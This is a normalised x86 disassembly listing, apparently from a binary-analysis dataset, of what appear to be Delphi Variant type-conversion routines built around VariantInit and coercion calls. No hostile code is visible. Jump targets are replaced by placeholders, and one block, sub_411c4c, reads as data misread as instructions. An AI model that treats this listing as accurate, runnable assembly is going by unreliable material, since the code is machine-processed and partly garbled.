fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e5d4
sub_411244
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411320
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4127d0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40aed0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411327
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0xc ]
call sub_404718
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_4096c0
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ea14
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ea14
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411330
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ea14
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411390
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ea14
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4113dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411431
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f0e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41148c
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411438
lea eax [ ebp - 0x18 ]
call sub_40edb8
retn
sub_411440
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4139fc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41148c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4114a8 ]
mov eax ebx
call sub_411244
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411390
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411244
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411330
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41148c
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411390
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4113dc
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e5d4
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411440
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411390
fstp [ esp ]
fwait
mov eax ebx
call sub_411390
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411673 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411390
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411244
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411330
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41148c
fstp [ esp ]
fwait
jmp r-xdata
sub_4117dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411888
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4127d0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409718
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41188f
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404718
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ea14
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ea14
jmp r-xdata
sub_411898
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ea14
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4118f8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ea14
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411944
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411999
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f0e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4119f4
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4119a0
lea eax [ ebp - 0x18 ]
call sub_40edb8
retn
sub_4119a8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4139fc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4119f4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411a10 ]
mov eax ebx
call sub_4117dc
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4118f8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4118f8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117dc
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411898
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4119f4
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4118f8
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411944
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e5d4
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4119a8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4118f8
fistp [ esp ]
fwait
mov eax ebx
call sub_4118f8
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411c15 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4118f8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4118f8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4117dc
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411898
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4119f4
fistp [ esp ]
fwait
jmp r-xdata
sub_411c4c
add [ ebp + ebx + 0x1d8c0041 ] cl
inc ecx
add dl dh
sbb al 0x41
add [ edi ] cl
sbb eax 0x1d2c0041
inc ecx
add [ esi + 0x1d ] al
inc ecx
add [ ebp + 0x1d ] ah
inc ecx
add [ ebx + 0xdf0843 ] cl
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
sub_411dc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404718
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ea14
pop ebx
pop ebp
retn 0x8
sub_411df8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404718
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ea14
pop ebx
pop ebp
retn 0x8
sub_411e30
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411ee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404718
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ea14
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411eed
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4042c0
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407ef4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404864
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4042c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407eb8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404864
jmp r-xdata
jmp r-xdata
call sub_40e670
sub_411ef4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_411fb3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411f91
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ea14
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404828
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404914
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f98
lea eax [ ebp - 0x10 ]
call sub_40edb8
retn
sub_411fc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412016
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f0e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4120a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41201d
lea eax [ ebp - 0x10 ]
call sub_40edb8
retn
sub_412024
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4139fc
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412099
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40edb8
retn
sub_4120a8
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4125df
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4120e1 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40408c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404038
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40408c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409644
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40408c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409644
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40408c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411dc0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042c0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411df8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404828
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404914
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_411e30
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_4082c0
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40408c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_4082c0
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4120a8
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_411ef4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40408c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4125e6
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_40405c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404730
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_40405c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404730
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_411fc0
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40408c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40408c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e5d4
test ah 0x40
je r-xdata
mov eax esi
call sub_404038
mov edx eax
mov eax ebx
call sub_412024
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_411ef4
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_40408c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_411ef4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40408c
jmp r-xdata
jmp [ eax * 4 + jump_table_412375 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409644
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409644
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411dc0
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4042c0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_411df8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4042c0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404260
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411e30
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4042c0
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40408c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_4082c0
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_4082c0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40408c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4120a8
jmp r-xdata
sub_4125ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
